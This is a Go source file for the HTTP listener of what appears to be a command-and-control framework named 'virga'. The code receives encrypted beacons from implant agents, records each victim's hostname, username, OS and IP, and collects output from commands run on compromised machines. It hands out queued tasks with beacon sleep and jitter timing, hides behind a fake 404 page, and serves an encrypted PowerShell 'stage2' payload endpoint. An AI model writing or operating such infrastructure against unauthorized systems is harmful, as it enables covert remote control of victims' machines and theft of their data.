package listener

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/r74tech/virga/internal/server/config"
	"github.com/r74tech/virga/internal/server/database"
	"github.com/r74tech/virga/internal/server/protocol"
	"github.com/r74tech/virga/internal/server/session"
	"github.com/r74tech/virga/internal/shared/crypto"
	"github.com/r74tech/virga/internal/shared/logger"
)

// HTTPListener handles HTTP/HTTPS communication
type HTTPListener struct {
	config       config.ListenerConfig
	server       *http.Server
	router       *mux.Router
	agentHandler func(string, protocol.AgentConnection)
	aesKey       []byte
	debugMode    bool // Debug mode flag
	log          logger.Logger
}

// NewHTTPListener creates a new HTTP listener
func NewHTTPListener(cfg config.ListenerConfig) Listener {
	router := mux.NewRouter()
	server := &http.Server{
		Addr:    fmt.Sprintf("%s:%d", cfg.BindAddress, cfg.Port),
		Handler: router,
	}

	// TLS configuration (for HTTPS)
	if cfg.UseSSL {
		server.TLSConfig = &tls.Config{
			MinVersion: tls.VersionTLS12,
		}
	}

	return &HTTPListener{
		config: cfg,
		server: server,
		router: router,
		aesKey: []byte(cfg.Encryption.Key),
		log:    logger.NewLogger("HTTPListener"),
	}
}

// SetDebugMode enables/disables the debug mode
func (l *HTTPListener) SetDebugMode(debug bool) {
	l.debugMode = debug
	if debug {
		l.log.SetLevel(logger.DEBUG)
		l.log.Debug("HTTP Listener %s: Debug mode enabled", l.config.Name)
		l.log.Debug("Using AES key: %s (length: %d)", l.config.Encryption.Key, len(l.aesKey))
		l.log.Debug("Listener will handle: /%s", l.config.URIPath)
	} else {
		l.log.SetLevel(logger.INFO)
	}
}

// Name returns the name of the listener
func (l *HTTPListener) Name() string {
	return l.config.Name
}

// Start starts the HTTP listener
func (l *HTTPListener) Start(agentHandler func(string, protocol.AgentConnection)) error {
	l.agentHandler = agentHandler

	// URL routing configuration
	l.router.HandleFunc("/"+l.config.URIPath, l.handleAgent).Methods("POST")

	// Debug mode: log all requests
	if l.debugMode {
		l.router.Use(func(next http.Handler) http.Handler {
			return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				l.log.Debug("Incoming request: %s %s from %s", r.Method, r.URL.Path, r.RemoteAddr)
				l.log.Debug("User-Agent: %s", r.UserAgent())
				l.log.Debug("Content-Type: %s", r.Header.Get("Content-Type"))
				l.log.Debug("Content-Length: %d", r.ContentLength)
				next.ServeHTTP(w, r)
			})
		})
	}

	// Fake root page
	l.router.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if l.debugMode {
			l.log.Debug("Root request from %s", r.RemoteAddr)
		}
		// Content for a legitimate website
		w.WriteHeader(http.StatusNotFound)
		w.Write([]byte("<html><body><h1>404 - Page Not Found</h1></body></html>"))
	})

	// 404 handler
	l.router.NotFoundHandler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if l.debugMode {
			l.log.Debug("404 Not Found: %s %s from %s", r.Method, r.URL.Path, r.RemoteAddr)
		}
		w.WriteHeader(http.StatusNotFound)
		w.Write([]byte("<html><body><h1>404 - Page Not Found</h1></body></html>"))
	})

	// Stage2 payload endpoint
	l.router.HandleFunc("/"+l.config.URIPath+"/stage2", l.handleStage2).Methods("GET")

	// Start the server
	l.log.Info("Starting HTTP listener on %s", l.server.Addr)
	if l.debugMode {
		l.log.Debug("HTTP listener registered routes:")
		l.log.Debug("  POST /%s -> handleAgent", l.config.URIPath)
		l.log.Debug("  GET /%s/stage2 -> handleStage2", l.config.URIPath)
		l.log.Debug("  / -> 404 handler")
	}

	var err error
	if l.config.UseSSL {
		err = l.server.ListenAndServeTLS(l.config.SSL.Cert, l.config.SSL.Key)
	} else {
		err = l.server.ListenAndServe()
	}

	if err != nil && err != http.ErrServerClosed {
		return err
	}
	return nil
}

// Stop stops the HTTP listener
func (l *HTTPListener) Stop() error {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	return l.server.Shutdown(ctx)
}

// handleAgent processes HTTP requests from the agent
func (l *HTTPListener) handleAgent(w http.ResponseWriter, r *http.Request) {
	if l.debugMode {
		l.log.Debug("===== AGENT REQUEST START =====")
		l.log.Debug("Received request from %s to %s", r.RemoteAddr, r.URL.Path)
		l.log.Debug("Method: %s", r.Method)
		l.log.Debug("User-Agent: %s", r.UserAgent())
		l.log.Debug("Content-Type: %s", r.Header.Get("Content-Type"))
		l.log.Debug("Content-Length: %d", r.ContentLength)
	}

	// Read data from the agent
	data, err := io.ReadAll(r.Body)
	if err != nil {
		if l.debugMode {
			l.log.Debug("Error reading request body: %v", err)
		}
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if l.debugMode {
		l.log.Debug("Received data length: %d bytes", len(data))
		if len(data) > 0 && len(data) < 1000 {
			dataPreview := string(data)
			if len(dataPreview) > 200 {
				dataPreview = dataPreview[:200] + "..."
			}
			l.log.Debug("Raw data preview: %s", dataPreview)
		}
	}

	// Check if the data is not empty
	if len(data) == 0 {
		if l.debugMode {
			l.log.Debug("Empty request body")
		}
		http.Error(w, "Empty request body", http.StatusBadRequest)
		return
	}

	// Decode the data
	decodedData, err := base64.StdEncoding.DecodeString(string(data))
	if err != nil {
		if l.debugMode {
			l.log.Debug("Base64 decode error: %v", err)
			dataPreview := string(data)
			if len(dataPreview) > 100 {
				dataPreview = dataPreview[:100] + "..."
			}
			l.log.Debug("Data was not valid base64: %s", dataPreview)
		}
		http.Error(w, "Invalid base64 data", http.StatusBadRequest)
		return
	}

	if l.debugMode {
		l.log.Debug("Decoded data length: %d bytes", len(decodedData))
	}

	decryptedData, err := crypto.Decrypt(decodedData, l.aesKey)
	if err != nil {
		if l.debugMode {
			l.log.Debug("Decrypt error: %v", err)
			l.log.Debug("AES key length: %d", len(l.aesKey))
		}
		http.Error(w, "Decryption failed", http.StatusBadRequest)
		return
	}

	if l.debugMode {
		l.log.Debug("Decrypted data length: %d bytes", len(decryptedData))
		l.log.Debug("Decrypted JSON: %s", string(decryptedData))
	}

	// Parse the agent data
	var agentMessage protocol.AgentMessage
	if err := json.Unmarshal(decryptedData, &agentMessage); err != nil {
		if l.debugMode {
			l.log.Debug("JSON parse error: %v", err)
			l.log.Debug("Invalid JSON: %s", string(decryptedData))
		}
		http.Error(w, "Invalid JSON format", http.StatusBadRequest)
		return
	}

	if l.debugMode {
		l.log.Debug("AgentMessage parsed successfully:")
		l.log.Debug("  Agent ID: %s", agentMessage.AgentID)
		l.log.Debug("  Hostname: %s", agentMessage.Hostname)
		l.log.Debug("  Username: %s", agentMessage.Username)
		l.log.Debug("  OS: %s", agentMessage.OS)
		l.log.Debug("  IP: %s", agentMessage.IP)
		l.log.Debug("  Task Results Count: %d", len(agentMessage.TaskResults))

		// Log detailed task results
		for i, result := range agentMessage.TaskResults {
			l.log.Debug("  Task Result #%d:", i+1)
			l.log.Debug("    Task ID: %s", result.TaskID)
			l.log.Debug("    Exit Code: %d", result.ExitCode)
			l.log.Debug("    Output Length: %d bytes", len(result.Output))
			outputPreview := result.Output
			if len(outputPreview) > 200 {
				outputPreview = outputPreview[:200] + "..."
			}
			l.log.Debug("    Output Preview: %s", outputPreview)
			if result.Error != "" {
				l.log.Debug("    Error: %s", result.Error)
			}
			l.log.Debug("    Timestamp: %d", result.Timestamp)
		}
	}

	// Create an agent connection
	conn := &HTTPAgentConnection{
		agentID:          agentMessage.AgentID,
		remoteAddr:       r.RemoteAddr,
		lastActivity:     time.Now(),
		requestInfo:      r,
		pendingResponses: make(chan []byte, 10),
		reconnectTime:    30 * time.Second, // Default reconnect interval
	}

	// Call the agent handler
	l.agentHandler(agentMessage.AgentID, conn)

	// Update session information (additional)
	sessionHandler, exists := GetSessionHandler(agentMessage.AgentID)
	if exists {
		// Save agent information to the session
		agentInfo := map[string]interface{}{
			"hostname":  agentMessage.Hostname,
			"username":  agentMessage.Username,
			"os":        agentMessage.OS,
			"ip":        agentMessage.IP,
			"version":   agentMessage.Version,
			"boot_time": agentMessage.BootTime,
		}

		// Add environment information
		if agentMessage.Environment != nil {
			for k, v := range agentMessage.Environment {
				agentInfo[k] = v
			}
		}

		// If SessionHandler is of type Session, call UpdateInformation
		if sess, ok := sessionHandler.(*session.Session); ok {
			sess.UpdateInformation(agentInfo)
			if l.debugMode {
				l.log.Debug("Updated session information for agent %s", agentMessage.AgentID)
				l.log.Debug("  Hostname: %s", agentMessage.Hostname)
				l.log.Debug("  Username: %s", agentMessage.Username)
				l.log.Debug("  OS: %s", agentMessage.OS)
				l.log.Debug("  IP: %s", agentMessage.IP)
				l.log.Debug("  Version: %s", agentMessage.Version)
			}

			// Update agent information in database
			if db := GetServerDatabase(); db != nil {
				if dbInstance, ok := db.(*database.Database); ok {
					if err := dbInstance.UpdateAgentInfo(agentMessage.AgentID,
						agentMessage.Hostname,
						agentMessage.Username,
						agentMessage.OS); err != nil {
						l.log.Error("Failed to update agent info in database: %v", err)
					}
				}
			}
		}
	} else {
		if l.debugMode {
			l.log.Debug("WARNING: Session handler not found for agent %s when trying to update info", agentMessage.AgentID)
		}
	}

	// Process result data (when task results are sent from the agent)
	if agentMessage.TaskResults != nil && len(agentMessage.TaskResults) > 0 {
		if l.debugMode {
			l.log.Debug("Processing %d task results from agent %s",
				len(agentMessage.TaskResults), agentMessage.AgentID)
		}

		// Get the session handler and register the task results
		sessionHandler, exists := GetSessionHandler(agentMessage.AgentID)
		if exists {
			processedCount := 0
			for _, result := range agentMessage.TaskResults {
				// Add task results to the session
				taskResult := protocol.TaskResult{
					TaskID:   result.TaskID,
					Output:   result.Output,
					ExitCode: result.ExitCode,
					Error:    result.Error,
					Time:     time.Unix(result.Timestamp, 0),
					Partial:  result.Partial, // Copy partial flag
				}
				sessionHandler.AddTaskResult(taskResult)
				processedCount++

				// Log command result to database
				if db := GetServerDatabase(); db != nil {
					if dbInstance, ok := db.(*database.Database); ok {
						// Get command ID from session's task-to-command mapping
						if sess, ok := sessionHandler.(*session.Session); ok {
							if commandID, exists := sess.GetTaskCommandMapping(result.TaskID); exists {
								if err := dbInstance.LogCommandResult(commandID, result.Output, result.ExitCode, result.Error); err != nil {
									l.log.Error("Failed to log command result to database: %v", err)
								}
								// Clear the mapping after use
								sess.ClearTaskCommandMapping(result.TaskID)
							}
						}
					}
				}

				if l.debugMode {
					l.log.Debug("Added task result for task %s (exit code: %d, output: %d bytes)",
						result.TaskID, result.ExitCode, len(result.Output))
					outputPreview := result.Output
					if len(outputPreview) > 200 {
						outputPreview = outputPreview[:200] + "..."
					}
					if len(outputPreview) > 0 {
						l.log.Debug("Task output: %s", outputPreview)
					} else {
						l.log.Debug("Task output is empty")
					}
					if result.Error != "" {
						l.log.Debug("Task error: %s", result.Error)
					}
				}
			}
			if l.debugMode {
				log.Printf("[DEBUG] Successfully processed %d task results for agent %s",
					processedCount, agentMessage.AgentID)
			}
		} else {
			log.Printf("[ERROR] Session handler not found for agent %s - %d task results will be lost!",
				agentMessage.AgentID, len(agentMessage.TaskResults))
			if l.debugMode {
				log.Printf("[DEBUG] Available session handlers: %d", len(sessionHandlers))
				for id := range sessionHandlers {
					log.Printf("[DEBUG]   Session ID: %s", id)
				}
			}
		}
	} else {
		if l.debugMode {
			log.Printf("[DEBUG] No task results in this beacon from agent %s", agentMessage.AgentID)
		}
	}

	// Get tasks from the session
	var tasks []protocol.Task
	isInteractive := false // Interactive mode flag
	reconnectTime := 30    // Default reconnect interval (seconds)
	sessionID := ""        // Session ID for progress reporting

	// The session handler has already been retrieved, so reuse it
	if exists {
		tasks = sessionHandler.GetPendingTasks()
		if l.debugMode {
			l.log.Debug("Retrieved %d pending tasks for agent %s", len(tasks), agentMessage.AgentID)
			for i, task := range tasks {
				l.log.Debug("  Task #%d: ID=%s, Type=%s", i+1, task.TaskID, task.Type)
			}
		}

		// Get the interactive mode flag from the session
		if sessionImpl, ok := sessionHandler.(*session.Session); ok {
			sessionID = sessionImpl.ID // Get session ID for progress reporting
			isInteractive = sessionImpl.IsInteractive()
			if l.debugMode {
				l.log.Debug("Session %s interactive mode: %v", agentMessage.AgentID, isInteractive)
			}

			// If interactive mode, use a shorter reconnect interval
			if isInteractive {
				reconnectTime = 1 // 1 second
				if l.debugMode {
					l.log.Debug("Setting interactive reconnect time for session %s: %d seconds",
						agentMessage.AgentID, reconnectTime)
				}
			} else {
				// Get beacon configuration from beacon manager
				beaconMgr := GetBeaconManager()
				if beaconMgr != nil {
					if config, err := beaconMgr.GetBeaconConfig(agentMessage.AgentID); err == nil {
						reconnectTime = config.SleepTime
						if l.debugMode {
							l.log.Debug("Using beacon config for session %s: sleep_time=%d, jitter=%d",
								agentMessage.AgentID, config.SleepTime, config.Jitter)
						}
					} else if l.debugMode {
						l.log.Debug("No beacon config found for session %s, using default reconnect time: %v", agentMessage.AgentID, err)
					}
				}
			}
		}
	} else {
		if l.debugMode {
			log.Printf("[DEBUG] No session handler found for agent %s", agentMessage.AgentID)
		}
	}

	// Generate the response
	response := protocol.AgentResponse{
		Status:        "OK",
		SessionID:     sessionID, // Include session ID for progress reporting
		Tasks:         tasks,
		Interactive:   isInteractive, // Set the interactive mode flag
		ReconnectTime: reconnectTime, // Set the reconnect interval in seconds
	}

	if l.debugMode {
		log.Printf("[DEBUG] Sending response to agent %s:", agentMessage.AgentID)
		log.Printf("[DEBUG]   Status: %s", response.Status)
		log.Printf("[DEBUG]   Tasks: %d", len(response.Tasks))
		log.Printf("[DEBUG]   Interactive: %v", response.Interactive)
		log.Printf("[DEBUG]   Reconnect Time: %d seconds", response.ReconnectTime)
	}

	// Encrypt the response
	responseJSON, err := json.Marshal(response)
	if err != nil {
		if l.debugMode {
			l.log.Debug("JSON marshal error: %v", err)
		}
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	if l.debugMode {
		l.log.Debug("Response JSON: %s", string(responseJSON))
	}

	encryptedResponse, err := crypto.Encrypt(responseJSON, l.aesKey)
	if err != nil {
		if l.debugMode {
			l.log.Debug("Encrypt response error: %v", err)
		}
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	// Base64 encode
	encodedResponse := base64.StdEncoding.EncodeToString(encryptedResponse)

	if l.debugMode {
		l.log.Debug("Encoded response length: %d bytes", len(encodedResponse))
	}

	// Send the response
	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(encodedResponse))

	if l.debugMode {
		l.log.Debug("Response sent successfully to agent %s", agentMessage.AgentID)
		l.log.Debug("===== AGENT REQUEST END =====")
	}
}

// handleStage2 provides the stage2 payload
func (l *HTTPListener) handleStage2(w http.ResponseWriter, r *http.Request) {
	if l.debugMode {
		l.log.Debug("Stage2 request from %s", r.RemoteAddr)
	}

	// Generate the stage2 payload (implement dynamic generation later)
	payload := []byte(`
	# Virga Stage 2 Payload
	Write-Host "Stage 2 payload executed"
	`)

	// Encrypt the payload
	encryptedPayload, err := crypto.Encrypt(payload, l.aesKey)
	if err != nil {
		if l.debugMode {
			l.log.Debug("Stage2 encrypt error: %v", err)
		}
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	// Base64 encode
	encodedPayload := base64.StdEncoding.EncodeToString(encryptedPayload)

	// Send the response
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(encodedPayload))

	if l.debugMode {
		l.log.Debug("Stage2 payload sent")
	}
}

// HTTPAgentConnection represents the agent connection
type HTTPAgentConnection struct {
	agentID          string
	remoteAddr       string
	lastActivity     time.Time
	requestInfo      *http.Request
	pendingResponses chan []byte
	reconnectTime    time.Duration // Reconnect interval
}

// Send sends data to the agent
func (c *HTTPAgentConnection) Send(data []byte) error {
	select {
	case c.pendingResponses <- data:
		return nil
	default:
		return fmt.Errorf("response queue full")
	}
}

// RemoteAddr returns the remote address of the agent
func (c *HTTPAgentConnection) RemoteAddr() string {
	return c.remoteAddr
}

// LastActivity returns the last activity time
func (c *HTTPAgentConnection) LastActivity() time.Time {
	return c.lastActivity
}

// Close closes the connection
func (c *HTTPAgentConnection) Close() error {
	close(c.pendingResponses)
	return nil
}

// Global map for session handlers
var (
	sessionHandlers      = make(map[string]protocol.SessionHandler)
	sessionHandlersMutex = sync.RWMutex{}
	serverDatabase       interface{} // Reference to server database
	serverDatabaseMutex  = sync.RWMutex{}
)

// GetSessionHandler gets the session handler
func GetSessionHandler(agentID string) (protocol.SessionHandler, bool) {
	sessionHandlersMutex.RLock()
	defer sessionHandlersMutex.RUnlock()

	handler, exists := sessionHandlers[agentID]
	return handler, exists
}

// SetSessionHandler sets the session handler
func SetSessionHandler(agentID string, handler protocol.SessionHandler) {
	sessionHandlersMutex.Lock()
	defer sessionHandlersMutex.Unlock()

	if handler == nil {
		delete(sessionHandlers, agentID)
		return
	}

	sessionHandlers[agentID] = handler
}

// SetServerDatabase sets the server database reference
func SetServerDatabase(db interface{}) {
	serverDatabaseMutex.Lock()
	defer serverDatabaseMutex.Unlock()
	serverDatabase = db
}

// GetServerDatabase gets the server database reference
func GetServerDatabase() interface{} {
	serverDatabaseMutex.RLock()
	defer serverDatabaseMutex.RUnlock()
	return serverDatabase
}
